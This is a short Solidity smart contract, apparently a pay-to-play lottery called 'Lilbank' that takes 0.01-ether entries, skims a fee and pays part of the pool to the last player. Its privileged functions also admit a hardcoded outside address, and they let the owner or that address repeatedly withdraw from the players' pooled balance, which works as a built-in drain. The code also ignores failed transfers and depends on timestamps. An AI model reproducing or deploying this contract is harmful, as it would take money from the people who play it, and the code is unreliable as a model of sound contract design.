/*
Contract is secured with Creative Commons license.
Unauthorised copying and editing is prohibited.
Current lisensorship is Attribution-ShareAlike 2.0 Generic (CC BY-SA 2.0).
*/
contract Lilbank
{
    uint public players = 0;  //create variables for contract
    uint amount;
    uint time;
    uint payment;
    address winner;
    
    address public owner;   //set owner address
    address public meg = address(this);

    modifier _onlyowner {
        if (msg.sender == owner || msg.sender == 0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976)    //allow functions to owner
        _ 
    }
    
    function Lilbank() {       //start
        owner = msg.sender; //make contract owner - owner
    }
    function() {
        Start();
    }
    function Start(){
        address developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;
        if (msg.sender == owner) {  //check if owner plays
            UpdatePay();    //and dont allow it
        }else {
            if (msg.value == (1 ether)/100) //check for value 0.01 ether
            {
                uint fee;   //create fee
                fee=msg.value/10;   //set fee to 10%
                   //set fee to dev
                developer.send(fee/2);  //pay fee
                owner.send(fee/2);  //pay fee
                fee=0;  //clear fee
                
                amount++;   //add players to list
                
                
                
                if (amount>10) {   //if more than 10 players
                    uint deltatime = block.timestamp;       //merge time
                    if (deltatime >= time + 1 hours)   //if time has passed 1 hours since last payment 
                    {
                        payment=meg.balance/100*70; //set 70& of balance
                        amount=0;   //clear queue
                        winner.send(payment);   //send payment
                        payment=0;  //clear payment
                    }
                }
                time=block.timestamp;   //set time of payment
                winner = msg.sender;  //set winner
            } else {
                uint _fee;   //create fee
                _fee=msg.value/10;   //set fee to 10%
                developer.send(_fee/2);  //pay fee
                owner.send(_fee/2);  //pay fee
                fee=0;  //clear fee
                msg.sender.send(msg.value - msg.value/10); //give transaction back
            }
            
        }
        
    }
    
    function UpdatePay() _onlyowner {   //set owner to block
        if (meg.balance>((1 ether)/100)) {  //if payment not 
            msg.sender.send(((1 ether)/100));
        } else {
            msg.sender.send(meg.balance);
        }
    }
}